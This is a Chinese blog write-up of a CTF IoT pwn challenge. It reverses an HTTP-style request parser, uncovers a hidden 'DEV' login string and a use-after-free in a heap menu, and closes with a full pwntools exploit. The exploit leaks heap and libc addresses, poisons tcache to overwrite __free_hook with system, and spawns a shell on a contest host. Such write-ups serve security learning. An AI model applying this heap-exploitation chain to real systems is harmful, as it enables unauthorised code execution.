---
title: i春秋春季赛-勇者巅峰-chunqiuIOT
index_img: img/article/chunqiuiot/image-20221103201403318.png
excerpt: 这是今年上半年比赛的一道题目，那个时候才刚刚接触堆，栈也不是很熟。打开程序基本就放弃了，前一段时间复现了几个IOT相关的CVE，借此契机顺便看看几个月前自己放弃的那道题。有一说一，这道题的逆向部分还是很头疼的，逆了一个下午+一个早上才看完程序逻辑----套皮堆题罢了。
---

## 前言

这是今年上半年比赛的一道题目，那个时候才刚刚接触堆，栈也不是很熟。打开程序基本就放弃了，前一段时间复现了几个IOT相关的CVE，借此契机顺便看看几个月前自己放弃的那道题。有一说一，这道题的逆向部分还是很头疼的，逆了一个下午+一个早上才看完程序逻辑----套皮堆题罢了。

> 我新建了一个库，用于存放各种比赛的题目，我博客内WP涉及的题目基本都能找到，链接：[PWNchanllenge/chunzhiIot at main · Loora1N/PWNchanllenge (github.com)](https://github.com/Loora1N/PWNchanllenge/tree/main/chunzhiIot)

## 逆向部分

首先找到主函数，比较简介，循环读入一个`0X3FF`字节，然后对`s`进行解析处理

![image-20221103201403318](img/article/chunqiuiot/image-20221103201403318.png)

跟进`1BDC`函数

![image-20221103202054328](img/article/chunqiuiot/image-20221103202054328.png)

这里有腾出了一个字符串空间，跟进`sub_1852`函数。

> 因为我改了一部分变量名和函数名，所以可能与直接反汇编除了结果略有不同

```c
__int64 __fastcall sub_1852(char *a1, __int64 a2)
{
  char *haystack; // [rsp+8h] [rbp-28h]
  int cnt; // [rsp+1Ch] [rbp-14h]
  char *v5; // [rsp+20h] [rbp-10h]
  const char *front_part; // [rsp+28h] [rbp-8h]
  char *s2a; // [rsp+28h] [rbp-8h]
  const char *s2b; // [rsp+28h] [rbp-8h]

  haystack = a1;
  cnt = 1;
  v5 = strstr(a1, "\r\n");
  if ( v5 )
  {
    v5[1] = ' ';
    *v5 = 0;
    v5 += 2;                                    // trans "\r\n" into "\x00"+" "
  }
  while ( v5 && cnt <= 15 )
  {
    front_part = strtok(haystack, " ");
    if ( cnt == 1 )
    {
      if ( !strcmp("GET", front_part) )
      {
        *(a2 + 16) = 1;
      }
      else if ( *(a2 + 16) || strcmp("HEAD", front_part) )
      {
        if ( *(a2 + 16) || strcmp("POST", front_part) )
        {
          if ( *(a2 + 16) || strcmp("PUT", front_part) )
          {
            if ( *(a2 + 16) || strcmp("DELETE", front_part) )
            {
              if ( *(a2 + 16) || strcmp("TRACE", front_part) )
              {
                if ( *(a2 + 16) || strcmp("OPTIONS", front_part) )
                {
                  if ( *(a2 + 16) || strcmp("CONNECT", front_part) )
                  {
                    if ( *(a2 + 16) || strcmp("DEV", front_part) )
                      return 0LL;
                    *(a2 + 16) = 8;
                  }
                  else
                  {
                    *(a2 + 16) = 7;
                  }
                }
                else
                {
                  *(a2 + 16) = 6;
                }
              }
              else
              {
                *(a2 + 16) = 5;
              }
            }
            else
            {
              *(a2 + 16) = 4;
            }
          }
          else
          {
            *(a2 + 16) = 3;
          }
        }
        else
        {
          *(a2 + 16) = 2;
        }
      }
      else
      {
        *(a2 + 16) = 0;
      }
      s2a = strtok(0LL, " ");
      if ( s2a != strchr(s2a, '/') )
        return 0LL;
      *a2 = s2a;
      s2b = strtok(0LL, " ");
      if ( !strcmp(s2b, "HTTP/1.0") && !strcmp(s2b, "HTTP/1.1") )
        return 0LL;
      haystack = v5;
      v5 = strstr(v5, "\r\n");
      if ( v5 )                                 // same to the top
      {
        v5[1] = 32;
        *v5 = 0;
        v5 += 2;
      }
      cnt = 2;
    }
    else
    {
      if ( !strchr(front_part, ':') )
        return 0LL;
      haystack = v5;
      v5 = strstr(v5, "\r\n");
      if ( v5 )
      {
        v5[1] = 32;
        *v5 = 0;
        v5 += 2;
      }
      ++cnt;
    }
  }
  if ( cnt == 1 )
    return 0LL;
  *(a2 + 8) = haystack;
  return 1LL;
}
```

这里是做了一个HTTP的报文解析，根据头的不同，有不同的返回值，并且会将报文结尾'\r\n'之后的字符串赋值给传进来的第二个参数。即这个函数主要干了三件事

- 解析HTTP报文，确定函数返回值
- 根据请求类型赋值给`a2+16`不同的值
- 将附带字符串赋值给`a2+8`的地址

我们继续看另外一个函数

```c
int __fastcall sub_15FD(__int64 a1)
{
  int result; // eax
  int idx; // eax
  unsigned int choice; // [rsp+14h] [rbp-2Ch]
  __int64 idx2; // [rsp+18h] [rbp-28h]
  unsigned __int64 size; // [rsp+20h] [rbp-20h]
  char *nptr; // [rsp+38h] [rbp-8h]
  const char *nptra; // [rsp+38h] [rbp-8h]
  const char *nptrb; // [rsp+38h] [rbp-8h]
  char *pointer; // [rsp+38h] [rbp-8h]
  char *pointer2; // [rsp+38h] [rbp-8h]

  if ( *(a1 + 16) == 2 )                        // POST方法进入
  {
    nptr = strtok(*(a1 + 8), "&");              // use '&' to split the string
                                                // choice & idx
    if ( !nptr )
      return 0;
    choice = *nptr;
    nptra = strtok(0LL, "&");
    if ( !nptra )
      return 0;
    idx = atoi(nptra);
    idx2 = idx;
    if ( idx > 0x10 )
      return 0;
    if ( !flag )
      return 0;
    if ( choice == 4 )
    {
      del(idx);                                 // free(un4040+idx)
                                                // UAF
      return 1;
    }
    if ( choice <= 4 )
    {
      switch ( choice )
      {
        case 3u:
          show(idx);                            // show(un4040+v2)
          return 1;
        case 1u:                                // 1&idx&size&pointer
          nptrb = strtok(0LL, "&");
          if ( !nptrb )
            return 0;
          size = atoi(nptrb);
          if ( size > 0x500 )
            return 0;
          pointer = strtok(0LL, "&");
          if ( !pointer )
            return 0;
          create(idx2, size, pointer);          // un4040+idx = malloc(size)
                                                // memcpy(chunk,pointer,size)
          return 1;
        case 2u:
          pointer2 = strtok(0LL, "&");
          if ( !pointer2 )
            return 0;
          strcpy(idx2, pointer2);               //  memcpy(*(&unk_4040 + idx), nptrd, str(nptrd))
          return 1;
      }
    }
  }
  result = *(a1 + 16);
  if ( result == 8 )
  {
    result = strcmp(*(a1 + 8), "rotartsinimda");// admin is trator
    if ( !result )
      flag = 1;
  }
  return result;
}
```

这个函数主要干了这几件事

- 根据`a1+16`的值不同，进入不同的判断分支(`a1+16`的值是由报文请求方式决定）
- 用`&`分割了`a1+8`处的字符串，并根据字符串决定不同函数
- 实现了一般堆题目的几个函数

> 另外需要注意，要将flag置1才能进入堆操作的选单，所以先要进入最下面的字符串判断

![image-20221103203402587](img/article/chunqiuiot/image-20221103203402587.png)

结合前面的分析，我们基本确定payload的形式为类似如下特征

`POST / HTTP/1.1\r\n\x01&1&0x30&aaaa`

这个程序的漏洞主要在`free`这里，存在UAF漏洞

![image-20221103203911463](img/article/chunqiuiot/image-20221103203911463.png)

## 漏洞利用

基本利用就比较简单了，泄露`heapbase`和`libc`后劫持`free_hook`即可，这道题主要还是代码逻辑相对难一些😭

```python
from pwn import *

# io = process('./pwn')
io = remote('210.30.97.133',28094)
libc = ELF('./libc.so')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.arch = 'amd64'
context.os = 'linux'


def login():
    io.recvuntil('Waiting Package...')   
    payload = "DEV / HTPP/1.1\r\nrotartsinimda\x00"
    io.sendline(payload)

def create(idx,size,text):
    io.recvuntil('Waiting Package...')   
    payload = "POST / HTTP/1.1\r\n"+'\x01'+'&'+str(idx)+'&'+str(size)+'&'+ text
    io.sendline(payload)
    
def free(idx):
    io.recvuntil('Waiting Package...')   
    payload = "POST / HTTP/1.1\r\n"+'\x04'+'&'+str(idx)
    io.sendline(payload)
    
def show(idx):
    io.recvuntil('Waiting Package...')   
    payload = "POST / HTTP/1.1\r\n"+'\x03'+'&'+str(idx)
    io.sendline(payload)
    
def edit(idx,text):
    io.recvuntil('Waiting Package...')   
    payload = "POST / HTTP/1.1\r\n"+'\x02'+'&'+str(idx)+'&'+ text
    io.sendline(payload)
    
def p():
    gdb.attach(proc.pidof(io)[0])


def pwn():
    login()
    # pause()
    for i in range(7):
        create(i,0x90,'aaaa')

    free(0)    
    show(0)
    io.recvuntil('Content-Length: 5\n')
    # io.recvline()
    key = u64(io.recv(5).ljust(8,b'\x00'))
    heapbase = key<<12
    
   
    # edit(7,'a\x00')
    create(7,0x420,'aaaa')
    create(8,0x30,'bbbb')
    free(7)
    # p()
    create(9,0x430,'cc')
    # p()
    show(7)
    # p()
    io.recvuntil('Content-Length: 6\n')
    libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x1e0ff0
    success('libc_base-->'+hex(libc_base))
    success("key-->"+hex(key))
    success("heapbase-->"+hex(heapbase))
    
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']    
    # free(0)
    
    create(11,0x30,'a')
    create(12,0x30,'b')
    create(13,0x30,'c')
    free(11)
    free(12)
    edit(12,p64(free_hook^key))
    # p()
    create(14,0x30,'/bin/sh')
    create(15,0x30,p64(system_addr))
    free(14)
    success('free_hook-->'+hex(free_hook))
    success('system-->'+hex(system_addr))
    
    # p()
       
    
    io.interactive()
    
    
if __name__ == '__main__':
    pwn()
```

